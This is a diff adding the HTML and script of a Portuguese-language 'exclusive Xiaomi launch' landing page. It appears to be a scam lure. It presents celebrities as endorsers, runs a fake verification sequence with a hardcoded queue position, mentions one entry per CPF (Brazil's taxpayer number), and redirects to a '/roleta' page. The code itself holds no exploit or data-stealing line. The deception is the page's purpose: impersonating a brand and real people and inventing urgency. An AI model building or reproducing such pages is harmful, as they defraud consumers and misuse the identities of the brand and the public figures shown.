@@ -1,0 +1,649 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lançamento Exclusivo Xiaomi</title>
+  <link rel="stylesheet" href="css/xIcwQLcxXzPi.css">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+  <script src="js/EpjHdOat80Pg.js" async=""></script>
+  <script src="js/XcBlXjoIFM8L.js" async="" type="module"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+      color: white;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    header {
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    
+    header img {
+      height: 80px;
+      width: auto;
+    }
+    
+    .main-container {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 30px;
+      width: 100%;
+      max-width: 1200px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+    
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+      font-family: 'Montserrat', sans-serif;
+    }
+    
+    p {
+      font-size: 18px;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
+    
+    .influencers-container {
+      display: flex;
+      justify-content: center;
+      gap: 35px;
+      margin: 30px 0;
+      flex-wrap: wrap;
+    }
+    
+    .influencer-card {
+      position: relative;
+      width: 280px;
+      height: 350px;
+      border-radius: 18px;
+      overflow: hidden;
+      box-shadow: 0 12px 25px rgba(0, 0, 0, 0.3);
+      transition: transform 0.4s ease, box-shadow 0.4s ease;
+      background: rgba(0, 0, 0, 0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .influencer-card:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 18px 30px rgba(0, 0, 0, 0.4);
+    }
+    
+    .influencer-image {
+      width: 100%; /* Alterado para 100% para caber no container */
+      height: 100%; /* Alterado para 100% para caber no container */
+      object-fit: contain; /* Alterado de 'cover' para 'contain' para mostrar imagem completa */
+      border-radius: 10px;
+      transition: transform 0.5s ease;
+    }
+    
+    .influencer-card:hover .influencer-image {
+      transform: scale(1.05);
+    }
+    
+    .pulsante {
+      animation: pulsar 2.5s infinite ease-in-out;
+    }
+    
+    @keyframes pulsar {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+      100% { transform: scale(1); }
+    }
+    
+    .name-overlay {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(to top, rgba(0, 0, 0, 0.9), transparent);
+      padding: 22px 12px 12px;
+      text-align: center;
+    }
+    
+    .influencer-name {
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.9);
+    }
+    
+    .hearts-container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 2;
+    }
+    
+    .heart {
+      position: absolute;
+      font-size: 22px;
+      color: #ff7700;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 3;
+    }
+    
+    @keyframes floatHeart {
+      0% {
+        opacity: 1;
+        transform: translate(0, 0) scale(0.5);
+      }
+      50% {
+        opacity: 0.8;
+      }
+      100% {
+        opacity: 0;
+        transform: translate(var(--x), var(--y)) scale(1.8);
+      }
+    }
+    
+    /* Estilos para a seção do vídeo */
+    .video-section {
+      margin: 30px 0;
+      text-align: center;
+    }
+    
+    .video-title {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 18px;
+      color: #fff;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+      letter-spacing: 0.5px;
+    }
+    
+    .video-container {
+      width: 100%;
+      max-width: 350px;
+      margin: 0 auto;
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+    }
+    
+    wistia-player {
+      display: block;
+      width: 100%;
+      height: auto;
+    }
+    
+    /* Seção do Danilo Gentili - MAIOR E MAIS DESTACADA */
+    .danilo-section {
+      margin: 40px 0 30px;
+      text-align: center;
+    }
+    
+    .danilo-title {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 22px;
+      color: #fff;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.6);
+      letter-spacing: 0.5px;
+    }
+    
+    .danilo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 15px;
+    }
+    
+    .danilo-card {
+      position: relative;
+      width: 380px; /* Largura aumentada */
+      height: 380px; /* Altura aumentada */
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+      transition: transform 0.4s ease, box-shadow 0.4s ease;
+      background: rgba(0, 0, 0, 0.25);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 3px solid rgba(255, 165, 0, 0.3);
+    }
+    
+    .danilo-card:hover {
+      transform: translateY(-10px) scale(1.02);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+    }
+    
+    .danilo-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover; /* Alterado para cover para preencher o espaço */
+      border-radius: 15px;
+      transition: transform 0.5s ease;
+    }
+    
+    .danilo-card:hover .danilo-image {
+      transform: scale(1.08);
+    }
+    
+    .danilo-pulsante {
+      animation: pulsar-danilo 2s infinite ease-in-out;
+    }
+    
+    @keyframes pulsar-danilo {
+      0% { transform: scale(1); box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); }
+      50% { transform: scale(1.1); box-shadow: 0 20px 40px rgba(255, 165, 0, 0.3); }
+      100% { transform: scale(1); box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); }
+    }
+    
+    .danilo-name {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 32px;
+      font-weight: bold;
+      color: white;
+      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.9);
+      margin-top: 20px;
+      letter-spacing: 1px;
+    }
+    
+    .verification-section {
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 15px;
+      padding: 22px;
+      margin: 30px 0;
+      text-align: left;
+    }
+    
+    .verification-step {
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+      padding: 14px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: opacity 0.5s ease, transform 0.5s ease;
+    }
+    
+    .verification-step.active {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    
+    .verification-step i {
+      margin-right: 16px;
+      font-size: 22px;
+      color: #4CAF50;
+    }
+    
+    .verification-text {
+      font-size: 16px;
+    }
+    
+    .btn {
+      background: linear-gradient(to right, #ff7700, #ff5500);
+      color: white;
+      border: none;
+      padding: 18px 45px;
+      font-size: 18px;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-top: 30px;
+      font-weight: bold;
+      box-shadow: 0 6px 18px rgba(255, 119, 0, 0.4);
+      transition: all 0.3s ease;
+      opacity: 0;
+      pointer-events: none;
+    }
+    
+    .btn.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 25px rgba(255, 119, 0, 0.6);
+    }
+    
+    .btn:active {
+      transform: translateY(1px);
+    }
+    
+    .footer {
+      margin-top: 35px;
+      text-align: center;
+      font-size: 14px;
+      opacity: 0.8;
+    }
+    
+    /* Estilo de fallback para o player Wistia */
+    wistia-player[media-id='xkeaiehunf']:not(:defined) {
+      background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/xkeaiehunf/swatch');
+      display: block;
+      filter: blur(5px);
+      padding-top: 177.78%; /* Proporção 9:16 (retrato) */
+    }
+    
+    @media (max-width: 1100px) {
+      .influencer-card {
+        width: 240px;
+        height: 300px;
+      }
+      
+      .danilo-card {
+        width: 340px;
+        height: 340px;
+      }
+    }
+    
+    @media (max-width: 900px) {
+      .influencer-card {
+        width: 220px;
+        height: 280px;
+      }
+      
+      .danilo-card {
+        width: 320px;
+        height: 320px;
+      }
+      
+      .main-container {
+        padding: 25px 20px;
+      }
+    }
+    
+    @media (max-width: 768px) {
+      .influencer-card {
+        width: 200px;
+        height: 250px;
+      }
+      
+      .danilo-card {
+        width: 300px;
+        height: 300px;
+      }
+      
+      header img {
+        height: 70px;
+      }
+      
+      .video-container {
+        max-width: 300px;
+      }
+      
+      .video-title, .danilo-title {
+        font-size: 22px;
+      }
+      
+      .influencers-container {
+        gap: 25px;
+      }
+      
+      h1 {
+        font-size: 28px;
+      }
+      
+      .danilo-name {
+        font-size: 28px;
+      }
+    }
+    
+    @media (max-width: 600px) {
+      .influencer-card {
+        width: 170px;
+        height: 220px;
+      }
+      
+      .danilo-card {
+        width: 280px;
+        height: 280px;
+      }
+      
+      h1 {
+        font-size: 24px;
+      }
+      
+      .influencer-name {
+        font-size: 16px;
+      }
+      
+      .danilo-name {
+        font-size: 24px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .influencer-card {
+        width: 150px;
+        height: 200px;
+      }
+      
+      .danilo-card {
+        width: 260px;
+        height: 260px;
+      }
+      
+      .influencer-name {
+        font-size: 14px;
+      }
+      
+      .video-container {
+        max-width: 260px;
+      }
+      
+      .influencers-container {
+        gap: 15px;
+      }
+      
+      .danilo-name {
+        font-size: 22px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="images/ERaCsjtEPALy.png" alt="Xiaomi Logo">
+  </header>
+  
+  <div class="main-container">
+    <h1>Bem-vindo ao Lançamento Exclusivo Xiaomi!</h1>
+    <p>Aguarde um momento enquanto preparamos tudo para você...</p>
+    
+    <div class="influencers-container">
+      <!-- Anitta -->
+      <div class="influencer-card">
+        <img src="images/t6ZBimZ8JMEm.png" alt="Anitta" class="influencer-image pulsante">
+        <div class="name-overlay">
+          <div class="influencer-name">Anitta</div>
+        </div>
+        <div class="hearts-container" id="hearts-anitta"><div class="heart" style="left: 62.2315%; --x: -48.07586584591479px; --y: -103.87886679720377px; animation: 4.72755s linear 0.738079s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 13.691%; --x: -1.4399334066622638px; --y: -149.53683494567218px; animation: 4.90131s linear 0.295828s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 38.0456%; --x: -43.495020697523245px; --y: -77.76041045007281px; animation: 3.69496s linear 0.149615s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div></div>
+      </div>
+      
+      <!-- Ana Maria Braga -->
+      <div class="influencer-card">
+        <img src="images/q5ftf7n0vbH0.png" alt="Ana Maria Braga" class="influencer-image pulsante">
+        <div class="name-overlay">
+          <div class="influencer-name">Ana Maria Braga</div>
+        </div>
+        <div class="hearts-container" id="hearts-ana"><div class="heart" style="left: 49.6383%; --x: -37.21358870025953px; --y: -120.49993970746402px; animation: 4.38483s linear 0.143309s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 31.819%; --x: 37.19548792334781px; --y: -63.57144518247018px; animation: 3.9643s linear 1.66456s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 56.8138%; --x: -3.2516408379017703px; --y: -99.3818400539126px; animation: 3.8566s linear 0.433383s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div></div>
+      </div>
+      
+      <!-- Marcos Mion -->
+      <div class="influencer-card">
+        <img src="images/bqQp7IyZhmeO.jpg" alt="Marcos Mion" class="influencer-image pulsante">
+        <div class="name-overlay">
+          <div class="influencer-name">Marcos Mion</div>
+        </div>
+        <div class="hearts-container" id="hearts-mion"><div class="heart" style="left: 85.4005%; --x: -9.55250781197372px; --y: -67.93262833377045px; animation: 4.10431s linear 1.41663s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 8.4851%; --x: -31.723277029326404px; --y: -111.86237777415718px; animation: 4.65347s linear 0.316831s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 97.0206%; --x: -2.830428230129356px; --y: -146.8880679077421px; animation: 3.00978s linear 0.227875s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div></div>
+      </div>
+    </div>
+    
+    <!-- Seção do vídeo com título -->
+    <div class="video-section">
+      <div class="video-title">Clique e assista o recado</div>
+      <div class="video-container">
+        <wistia-player media-id="zkvnpe7g8j" aspect="0.5625"></wistia-player>
+      </div>
+    </div>
+    
+    <!-- Seção do Danilo Gentili - MAIOR E MAIS DESTACADA -->
+    <div class="danilo-section">
+      <div class="danilo-title">Destaque Especial</div>
+      <div class="danilo-container">
+        <div class="danilo-card danilo-pulsante">
+          <img src="images/AcJw5X3RpNkO.png" alt="Danilo Gentili" class="danilo-image">
+          <div class="hearts-container" id="hearts-danilo"><div class="heart" style="left: 82.0797%; --x: -23.555909609908298px; --y: -102.07652906447409px; animation: 3.33884s linear 0.468174s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 46.7586%; --x: -15.992457167811303px; --y: -83.52797082236458px; animation: 3.44582s linear 0.292871s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div><div class="heart" style="left: 95.6181%; --x: 14.083556107657525px; --y: -50.289868254688486px; animation: 4.6225s linear 1.38075s infinite normal none running floatHeart;"><i class="fas fa-heart"></i></div></div>
+        </div>
+      </div>
+      <div class="danilo-name">Danilo Gentili</div>
+    </div>
+    
+    <div class="verification-section">
+      <div class="verification-step" id="step1">
+        <i class="fas fa-sync fa-spin"></i>
+        <div class="verification-text">Verificando disponibilidade...</div>
+      </div>
+      
+      <div class="verification-step" id="step2">
+        <i class="fas fa-sync fa-spin"></i>
+        <div class="verification-text">Sua vez está próxima! <span id="queue-position">3/25</span> na fila</div>
+      </div>
+      
+      <div class="verification-step" id="step3">
+        <i class="fas fa-sync fa-spin"></i>
+        <div class="verification-text">Quase lá! Preparando experiência exclusiva</div>
+      </div>
+      
+      <div class="verification-step" id="step4">
+        <i class="fas fa-info-circle"></i>
+        <div class="verification-text">Clique em prosseguir, uma participação por CPF</div>
+      </div>
+    </div>
+    
+    <button class="btn" id="continue-btn">Prosseguir <i class="fas fa-arrow-right"></i></button>
+    
+    <div class="footer">
+      <p>© 2025 Promoção Exclusiva Xiaomi - Todos os direitos reservados</p>
+    </div>
+  </div>
+
+  <script>
+    // Função para criar corações
+    function createHearts(containerId) {
+      const container = document.getElementById(containerId);
+      const numberOfHearts = 12;
+      
+      for (let i = 0; i < numberOfHearts; i++) {
+        setTimeout(() => {
+          const heart = document.createElement('div');
+          heart.classList.add('heart');
+          heart.innerHTML = '<i class="fas fa-heart"></i>';
+          
+          // Posição aleatória na horizontal
+          const randomX = Math.random() * 100;
+          heart.style.left = `${randomX}%`;
+          
+          // Valores aleatórios para a animação
+          const randomY = -50 - Math.random() * 100;
+          const randomXEnd = (Math.random() - 0.5) * 100;
+          const duration = 3 + Math.random() * 2;
+          
+          heart.style.setProperty('--x', `${randomXEnd}px`);
+          heart.style.setProperty('--y', `${randomY}px`);
+          heart.style.animation = `floatHeart ${duration}s linear infinite`;
+          heart.style.animationDelay = `${Math.random() * 2}s`;
+          
+          container.appendChild(heart);
+        }, i * 200);
+      }
+    }
+    
+    // Inicializar corações para todas as imagens
+    createHearts('hearts-anitta');
+    createHearts('hearts-ana');
+    createHearts('hearts-mion');
+    createHearts('hearts-danilo'); // Adicionando corações para a imagem do Danilo
+    
+    // Simular processo de verificação gradual
+    const steps = document.querySelectorAll('.verification-step');
+    const continueBtn = document.getElementById('continue-btn');
+    let currentStep = 0;
+    
+    function showNextStep() {
+      if (currentStep < steps.length) {
+        // Mudar ícone para check quando completar
+        if (currentStep > 0) {
+          const prevIcon = steps[currentStep - 1].querySelector('i');
+          prevIcon.classList.remove('fa-sync', 'fa-spin');
+          prevIcon.classList.add('fa-check-circle');
+        }
+        
+        // Mostrar próximo passo
+        steps[currentStep].classList.add('active');
+        currentStep++;
+        
+        // Se for o último passo, mostrar o botão
+        if (currentStep === steps.length) {
+          setTimeout(() => {
+            continueBtn.classList.add('active');
+          }, 1000);
+        } else {
+          // Agendar próximo passo
+          const delay = currentStep === 1 ? 2000 : 1500;
+          setTimeout(showNextStep, delay);
+        }
+      }
+    }
+    
+    // Iniciar a sequência de verificação
+    setTimeout(showNextStep, 1000);
+    
+    // Adicionar funcionalidade ao botão
+    continueBtn.addEventListener('click', function() {
+      this.innerHTML = 'Redirecionando... <i class="fas fa-spinner fa-spin"></i>';
+      this.disabled = true;
+      
+      // Simular redirecionamento após 2 segundos
+      setTimeout(() => {
+        window.location.href = '/roleta';
+      }, 2000);
+    });
+    
+    // Efeito de digitação no título
+    const title = document.querySelector('h1');
+    const originalText = title.textContent;
+    title.textContent = '';
+    
+    let i = 0;
+    function typeWriter() {
+      if (i < originalText.length) {
+        title.textContent += originalText.charAt(i);
+        i++;
+        setTimeout(typeWriter, 50);
+      }
+    }
+    
+    setTimeout(typeWriter, 500);
+  </script>
+
+</body></html>
